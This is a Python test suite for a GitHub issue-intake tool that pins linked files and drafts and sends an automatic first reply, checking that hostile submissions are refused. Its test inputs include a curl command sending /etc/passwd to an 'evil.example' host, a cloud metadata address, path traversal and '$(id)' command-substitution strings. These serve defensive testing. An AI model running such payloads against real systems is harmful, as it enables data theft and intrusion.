"""The automatic first reply: what it reads, what it refuses, and who holds what.

The submission is hostile input by default. These tests feed it the things a
hostile submission would contain and check that none of them reaches the reply,
the route, or a command.
"""

from __future__ import annotations

import contextlib
import hashlib
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from support import REPO_ROOT

sys.path.insert(0, str(REPO_ROOT / "tools"))
import intake_ack  # noqa: E402

from workflow_reader import parse_jobs, triggers  # noqa: E402

WORKFLOW = REPO_ROOT / ".github" / "workflows" / "intake-acknowledge.yml"
SHA_A = "a" * 40
SHA_B = "b" * 40
RECORD = b'{"record": "sample"}\n'


def form(example: str = "", private: bool = False, source: str = "_No response_") -> str:
    box = "X" if private else " "
    return "\n\n".join([
        "### What is your system, specification or project called?", "Sample Receipts",
        "### Where can we read about it?", source,
        "### Which version?", "_No response_",
        "### What evidence, record or result does it produce?", "A signed receipt.",
        "### What do you want to find out?", "What the receipt supports.",
        "### What do you think that evidence lets you claim?", "_No response_",
        "### Public example or test material", example or "_No response_",
        "### What are you unsure about?", "_No response_",
        "### Private material", f"- [{box}] This case needs private evidence.",
        "### Before you submit", "- [X] I have not included any secret.",
    ])


class FakeNet:
    """Stands in for the two fixed hosts; records every address asked for."""

    def __init__(self, pages: dict[str, bytes]):
        self.pages, self.asked = pages, []

    def __call__(self, url, token=None):
        self.asked.append((url, token))
        return self.pages.get(url)


def raw(owner, repo, sha, path):
    return f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/{path}"


def api(owner, repo, ref):
    return f"https://api.github.com/repos/{owner}/{repo}/commits/{ref}"


class PinningTest(unittest.TestCase):

    def test_a_file_at_an_exact_commit_is_pinned_by_its_bytes(self):
        net = FakeNet({raw("acme", "receipts", SHA_A, "samples/r1.json"): RECORD})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/samples/r1.json"), fetch=net)
        self.assertEqual(found["files"], [{
            "owner": "acme", "repo": "receipts", "commit": SHA_A, "path": "samples/r1.json",
            "sha256": hashlib.sha256(RECORD).hexdigest(), "bytes": len(RECORD),
            "pinned_by_submitter": True}])
        self.assertEqual(found["route_label"], "route:research")

    def test_a_branch_link_is_resolved_and_said_to_be_resolved(self):
        net = FakeNet({api("acme", "receipts", "main"): json.dumps({"sha": SHA_B}).encode(),
                       raw("acme", "receipts", SHA_B, "r1.json"): RECORD})
        found = intake_ack.examine(form("https://github.com/acme/receipts/blob/main/r1.json"),
                                   fetch=net)
        self.assertEqual(found["files"][0]["commit"], SHA_B)
        self.assertFalse(found["files"][0]["pinned_by_submitter"])
        self.assertIn("resolved to the commit", intake_ack.render(found))

    def test_a_missing_file_or_commit_is_reported_not_guessed(self):
        net = FakeNet({})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/nope.json "
                 "https://github.com/acme/receipts/blob/no-such-branch/r1.json"), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(found["links_not_resolved"], 2)
        self.assertIn("No public bytes could be pinned yet", intake_ack.render(found))

    def test_a_submission_without_links_still_gets_a_reply_that_says_what_is_missing(self):
        found = intake_ack.examine(form(), fetch=FakeNet({}))
        reply = intake_ack.render(found)
        self.assertEqual(found["files"], [])
        self.assertIn("Edit your submission", reply)

    def test_a_repository_link_alone_pins_no_bytes(self):
        net = FakeNet({api("acme", "receipts", "HEAD"): json.dumps({"sha": SHA_B}).encode()})
        found = intake_ack.examine(form(source="https://github.com/acme/receipts"), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(found["repositories"], [{"owner": "acme", "repo": "receipts", "head": SHA_B}])
        self.assertIn("no bytes are pinned from it", intake_ack.render(found))

    def test_the_number_of_links_examined_is_bounded(self):
        links = " ".join(f"https://github.com/acme/receipts/blob/{SHA_A}/f{i}.json"
                         for i in range(40))
        net = FakeNet({raw("acme", "receipts", SHA_A, f"f{i}.json"): RECORD for i in range(40)})
        found = intake_ack.examine(form(links), fetch=net)
        self.assertEqual(len(found["files"]), intake_ack.MAX_LINKS)
        self.assertLessEqual(len(net.asked), intake_ack.MAX_LINKS)

    def test_an_oversized_body_is_cut_before_it_is_read(self):
        tail = f" https://github.com/acme/receipts/blob/{SHA_A}/late.json"
        net = FakeNet({raw("acme", "receipts", SHA_A, "late.json"): RECORD})
        found = intake_ack.examine(form("x" * (intake_ack.MAX_BODY_BYTES + 10) + tail), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(net.asked, [])


class HostileSubmissionTest(unittest.TestCase):

    def test_other_hosts_are_counted_and_never_fetched(self):
        net = FakeNet({})
        found = intake_ack.examine(
            form("https://evil.example/x.json http://169.254.169.254/latest/meta-data/ "
                 "https://gist.github.com/a/b https://github.com.evil.example/acme/r/blob/main/x"),
            fetch=net)
        self.assertEqual(net.asked, [])
        self.assertEqual(found["links_to_other_hosts"], 4)

    def test_path_traversal_and_odd_characters_do_not_classify(self):
        for url in (f"https://github.com/acme/receipts/blob/{SHA_A}/../../etc/passwd",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a/./b.json",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a%2F..%2Fb.json",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a.json?token=1",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/$(id).json",
                    "https://github.com/ac me/receipts",
                    f"https://user:pass@github.com/acme/receipts/blob/{SHA_A}/a.json"):
            with self.subTest(url=url):
                self.assertIsNone(intake_ack.classify(url))

    def test_command_text_in_the_form_reaches_neither_the_network_nor_the_reply(self):
        payload = '"; curl https://evil.example/$(cat /etc/passwd) #  `id`  ${{ secrets.X }}  @everyone'
        body = form(payload).replace("Sample Receipts", payload)
        net = FakeNet({})
        found = intake_ack.examine(body, fetch=net)
        reply = intake_ack.render(found)
        self.assertEqual(net.asked, [])
        for fragment in ("curl", "passwd", "`id`", "secrets.X", "@everyone", "Sample Receipts"):
            self.assertNotIn(fragment, reply)

    def test_the_reply_quotes_nothing_the_submitter_wrote(self):
        net = FakeNet({raw("acme", "receipts", SHA_A, "r1.json"): RECORD})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/r1.json"), fetch=net)
        reply = intake_ack.render(found)
        for prose in ("A signed receipt.", "What the receipt supports.", "Sample Receipts"):
            self.assertNotIn(prose, reply)

    def test_the_token_is_never_sent_to_the_raw_content_host(self):
        net = FakeNet({api("acme", "receipts", "main"): json.dumps({"sha": SHA_B}).encode(),
                       raw("acme", "receipts", SHA_B, "r1.json"): RECORD})
        intake_ack.examine(form("https://github.com/acme/receipts/blob/main/r1.json"),
                           fetch=net, token="t0ken")
        for url, token in net.asked:
            if url.startswith("https://raw.githubusercontent.com/"):
                self.assertIsNone(token)

    def test_the_real_fetcher_refuses_a_host_off_the_fixed_list(self):
        self.assertIsNone(intake_ack.http_fetch("https://evil.example/x"))

    def test_a_malformed_commit_answer_is_not_trusted(self):
        for answer in (b"not json", b'{"sha": "main"}', b'{"sha": 7}', b"[]"):
            with self.subTest(answer=answer):
                net = FakeNet({api("acme", "receipts", "main"): answer})
                found = intake_ack.examine(
                    form("https://github.com/acme/receipts/blob/main/r1.json"), fetch=net)
                self.assertEqual(found["files"], [])
                self.assertEqual(found["links_not_resolved"], 1)


DRAFT_TEXT = b"Internet-Draft text, revision two\n"


def archive(name):
    return f"https://www.ietf.org/archive/id/{name}.txt"


class DraftPinningTest(unittest.TestCase):

    def test_a_draft_named_with_its_revision_is_pinned_from_the_archive(self):
        net = FakeNet({archive("draft-example-record-02"): DRAFT_TEXT})
        for written in ("draft-example-record-02",
                        "https://datatracker.ietf.org/doc/draft-example-record/02/",
                        "https://datatracker.ietf.org/doc/html/draft-example-record-02",
                        "https://datatracker.ietf.org/doc/draft-example-record-02",
                        "https://www.ietf.org/archive/id/draft-example-record-02.txt"):
            with self.subTest(written=written):
                found = intake_ack.examine(form(source=written), fetch=net)
                self.assertEqual(found["drafts"], [{
                    "name": "draft-example-record", "rev": "02",
                    "sha256": hashlib.sha256(DRAFT_TEXT).hexdigest(), "bytes": len(DRAFT_TEXT)}])
                self.assertEqual(found["links_to_other_hosts"], 0)
        self.assertIn("| `draft-example-record` | 02 |", intake_ack.render(found))

    def test_the_same_draft_named_twice_is_fetched_once(self):
        net = FakeNet({archive("draft-example-record-02"): DRAFT_TEXT})
        found = intake_ack.examine(form(
            "draft-example-record-02 https://datatracker.ietf.org/doc/draft-example-record/02/"),
            fetch=net)
        self.assertEqual(len(found["drafts"]), 1)
        self.assertEqual(len(net.asked), 1)

    def test_a_draft_without_a_revision_is_not_fetched_and_the_reply_asks_for_it(self):
        net = FakeNet({})
        found = intake_ack.examine(
            form(source="https://datatracker.ietf.org/doc/draft-example-record/"), fetch=net)
        self.assertEqual(net.asked, [])
        self.assertEqual(found["drafts_without_revision"], 1)
        self.assertIn("Add the two-digit revision", intake_ack.render(found))

    def test_a_revision_the_archive_does_not_hold_is_reported_not_guessed(self):
        found = intake_ack.examine(form("draft-example-record-77"), fetch=FakeNet({}))
        self.assertEqual(found["drafts"], [])
        self.assertEqual(found["links_not_resolved"], 1)

    def test_the_number_of_drafts_fetched_is_bounded(self):
        names = [f"draft-example-r{i}-00" for i in range(12)]
        net = FakeNet({archive(n): DRAFT_TEXT for n in names})
        found = intake_ack.examine(form(" ".join(names)), fetch=net)
        self.assertEqual(len(found["drafts"]), intake_ack.MAX_DRAFTS)
        self.assertEqual(len(net.asked), intake_ack.MAX_DRAFTS)

    def test_only_the_archive_address_is_built_and_odd_names_do_not_classify(self):
        for text in ("https://www.ietf.org/archive/id/../x.txt",
                     "https://datatracker.ietf.org/doc/draft-Foo/02/",
                     "https://datatracker.ietf.org.evil.example/doc/draft-foo/02/",
                     "https://www.ietf.org/archive/id/draft-foo-02.txt?x=1",
                     "draft-foo-02/../../etc", "draft-$(id)-02"):
            with self.subTest(text=text):
                self.assertIsNone(intake_ack.classify_draft(text))
        net = FakeNet({})
        intake_ack.examine(form("draft-example-record-02"), fetch=net, token="t0ken")
        self.assertEqual(net.asked, [(archive("draft-example-record-02"), None)])

    def test_pinning_is_said_not_to_be_an_endorsement(self):
        net = FakeNet({archive("draft-example-record-02"): DRAFT_TEXT})
        reply = intake_ack.render(intake_ack.examine(form("draft-example-record-02"), fetch=net))
        self.assertIn("not a review and not an endorsement", reply)


class InitiatorTest(unittest.TestCase):

    LINK = f"https://github.com/acme/receipts/blob/{SHA_A}/r1.json"

    def pages(self, **extra):
        return {raw("acme", "receipts", SHA_A, "r1.json"): RECORD, **extra}

    def test_the_owner_of_a_linked_repository_is_recognised_without_a_request(self):
        net = FakeNet(self.pages(**{"https://api.github.com/repos/acme/receipts": json.dumps(
            {"full_name": "acme/receipts", "owner": {"login": "acme"}}).encode()}))
        found = intake_ack.examine(form(self.LINK), fetch=net, login="Acme")
        self.assertEqual(found["initiator"],
                         {"relation": "repository-owner", "repository": "acme/receipts"})
        self.assertEqual(len(net.asked), 2)
        self.assertIn("owns `acme/receipts`", intake_ack.render(found))

    def test_ownership_is_read_from_the_repository_record_not_from_the_link(self):
        for record in (None, b"not json", json.dumps({"full_name": "other/receipts", "owner": {"login": "other"}}).encode()):
            with self.subTest(record=record):
                extra = {} if record is None else {"https://api.github.com/repos/acme/receipts": record}
                found = intake_ack.examine(form(self.LINK), fetch=FakeNet(self.pages(**extra)), login="acme")
                self.assertEqual(found["initiator"], {"relation": "not-established", "repository": None})

    def test_a_public_member_of_the_owning_organization_is_recognised(self):
        net = FakeNet(self.pages(**{"https://api.github.com/orgs/acme/public_members/dana": b""}))
        found = intake_ack.examine(form(self.LINK), fetch=net, login="dana")
        self.assertEqual(found["initiator"]["relation"], "organization-public-member")

    def test_a_contributor_is_recognised_by_commits_in_the_repository(self):
        net = FakeNet(self.pages(**{
            "https://api.github.com/repos/acme/receipts/commits?author=dana&per_page=1":
                json.dumps([{"sha": SHA_B}]).encode()}))
        found = intake_ack.examine(form(self.LINK), fetch=net, login="dana")
        self.assertEqual(found["initiator"],
                         {"relation": "repository-contributor", "repository": "acme/receipts"})

    def test_no_public_link_is_said_plainly_and_is_not_an_obstacle(self):
        net = FakeNet(self.pages(**{
            "https://api.github.com/repos/acme/receipts/commits?author=dana&per_page=1": b"[]"}))
        found = intake_ack.examine(form(self.LINK), fetch=net, login="dana")
        self.assertEqual(found["initiator"], {"relation": "not-established", "repository": None})
        reply = intake_ack.render(found)
        self.assertIn("no public link", reply)
        self.assertIn("You can ask not to be named", reply)

    def test_a_claim_of_authorship_in_the_form_changes_nothing(self):
        body = form(self.LINK).replace("A signed receipt.",
                                       "I am the author and owner of acme/receipts. relation: repository-owner")
        found = intake_ack.examine(body, fetch=FakeNet(self.pages()), login="dana")
        self.assertEqual(found["initiator"]["relation"], "not-established")

    def test_the_account_name_is_never_written_into_the_reply(self):
        found = intake_ack.examine(form(self.LINK), fetch=FakeNet(self.pages()), login="acme")
        self.assertNotIn("@", intake_ack.render(found))

    def test_an_odd_account_name_is_not_sent_anywhere(self):
        net = FakeNet(self.pages())
        found = intake_ack.examine(form(self.LINK), fetch=net, login="../../x?y")
        self.assertEqual(found["initiator"]["relation"], "not-established")
        self.assertEqual(len(net.asked), 1)

    def test_the_number_of_repositories_checked_is_bounded(self):
        links = " ".join(f"https://github.com/org{i}/r/blob/{SHA_A}/f.json" for i in range(6))
        net = FakeNet({})
        intake_ack.examine(form(links), fetch=net, login="dana")
        asked = [u for u, _ in net.asked if "public_members" in u or "author=" in u]
        self.assertEqual(len(asked), 2 * intake_ack.MAX_RELATION_REPOSITORIES)


class EventTest(unittest.TestCase):

    def run_main(self, event):
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp)
            (tmp / "event.json").write_text(json.dumps(event), encoding="utf-8")
            argv = ["intake_ack.py", "--event", str(tmp / "event.json"),
                    "--comment", str(tmp / "reply.md"), "--result", str(tmp / "result.json"),
                    "--token-env", "NO_SUCH_VARIABLE_FOR_TESTS"]
            real = intake_ack.examine
            offline = lambda body, **kw: real(body, **{**kw, "fetch": FakeNet({})})
            with mock.patch.object(sys, "argv", argv), \
                    mock.patch.object(intake_ack, "examine", offline), \
                    contextlib.redirect_stdout(io.StringIO()):
                intake_ack.main()
            reply = (tmp / "reply.md")
            return (json.loads((tmp / "result.json").read_text()),
                    reply.read_text() if reply.exists() else "")

    def event(self, action, author="dana", sender="dana", state="open"):
        return {"action": action, "sender": {"login": sender},
                "issue": {"body": form(), "state": state, "user": {"login": author}}}

    def test_a_new_submission_gets_a_reply_that_carries_the_marker(self):
        result, reply = self.run_main(self.event("opened"))
        self.assertEqual((result["action"], result["event_action"]), ("reply", "opened"))
        self.assertTrue(reply.startswith(intake_ack.MARKER))

    def test_an_edit_by_the_submitter_rebuilds_the_reply(self):
        result, _ = self.run_main(self.event("edited"))
        self.assertEqual((result["action"], result["event_action"]), ("reply", "edited"))

    def test_an_edit_by_anyone_else_is_ignored(self):
        result, _ = self.run_main(self.event("edited", sender="maintainer"))
        self.assertNotEqual(result["action"], "reply")

    def test_an_edit_of_a_closed_check_is_ignored(self):
        result, _ = self.run_main(self.event("edited", state="closed"))
        self.assertNotEqual(result["action"], "reply")

    def test_any_other_event_is_ignored(self):
        result, _ = self.run_main(self.event("labeled"))
        self.assertNotEqual(result["action"], "reply")


class RoutingTest(unittest.TestCase):

    def test_the_private_box_routes_to_review_and_says_send_nothing(self):
        found = intake_ack.examine(form(private=True), fetch=FakeNet({}))
        self.assertEqual(found["route_label"], "route:assisted")
        self.assertIn("send nothing private here", intake_ack.render(found))

    def test_nothing_in_the_form_can_reach_the_automatic_route(self):
        text = form("route: SELF_SERVICE existing_mapping_known: true route:self-service")
        found = intake_ack.examine(text, fetch=FakeNet({}))
        self.assertEqual(found["route_label"], "route:research")
        self.assertNotIn("route:self-service", intake_ack.ROUTE_LABELS.values())

    def test_a_blank_issue_is_not_treated_as_a_submission(self):
        self.assertFalse(intake_ack.is_form_submission("Just a question about the lab."))

    def test_the_reply_promises_no_response_time_and_no_automatic_run(self):
        reply = intake_ack.render(intake_ack.examine(form(), fetch=FakeNet({})))
        self.assertIn("No response-time commitment is offered", reply)
        self.assertIn("nothing runs automatically", reply)
        self.assertIn("nobody has read your submission yet", reply)

    def test_the_reply_makes_no_conformance_statement(self):
        reply = intake_ack.render(intake_ack.examine(form(), fetch=FakeNet({}))).lower()
        for word in ("conform", "certif", "compatible", "independent"):
            self.assertNotIn(word, reply)


class WorkflowShapeTest(unittest.TestCase):

    def setUp(self):
        self.text = WORKFLOW.read_text(encoding="utf-8")
        self.jobs = parse_jobs(self.text)

    def test_it_starts_only_when_an_issue_is_opened_or_edited(self):
        self.assertEqual(set(triggers(self.text)), {"issues"})
        self.assertIn("types: [opened, edited]", self.text)
        self.assertNotIn("issue_comment", self.text)

    def test_the_earlier_reply_is_found_by_account_and_marker_and_only_its_number_is_used(self):
        reply = self.jobs["reply"].text
        self.assertIn('.user.login == "github-actions[bot]"', reply)
        self.assertIn(intake_ack.MARKER, reply)
        self.assertIn("| .id'", reply)
        self.assertIn('*[!0-9]*) echo "::error::unexpected comment number"', reply)

    def test_labels_are_set_only_for_a_new_submission(self):
        reply = self.jobs["reply"].text
        self.assertLess(reply.index('if [ "$event" = "opened" ]'), reply.index("gh issue edit"))

    def test_the_job_that_reads_the_submission_cannot_write(self):
        self.assertEqual(set(self.jobs), {"read", "reply"})
        self.assertNotIn("issues: write", self.jobs["read"].text)
        self.assertNotIn("secrets.", self.text)

    def test_the_job_that_can_write_never_reads_the_submission(self):
        reply = self.jobs["reply"].text
        self.assertIn("issues: write", reply)
        self.assertNotIn("actions/checkout", reply)
        self.assertNotIn("GITHUB_EVENT_PATH", reply)
        self.assertNotIn("intake_ack.py", reply)
        self.assertIn("needs: read", reply)

    def test_no_submitter_controlled_expression_is_interpolated(self):
        for field in ("issue.body", "issue.title", "issue.user", "comment.body", "issue.labels"):
            self.assertNotIn("github.event." + field, self.text)

    def test_only_the_two_fixed_route_labels_can_be_applied(self):
        self.assertIn("route:research|route:assisted) ;;", self.jobs["reply"].text)
        self.assertNotIn("route:self-service", self.text)

    def test_no_foreign_repository_is_checked_out(self):
        self.assertNotIn("repository:", self.text)


if __name__ == "__main__":
    unittest.main()
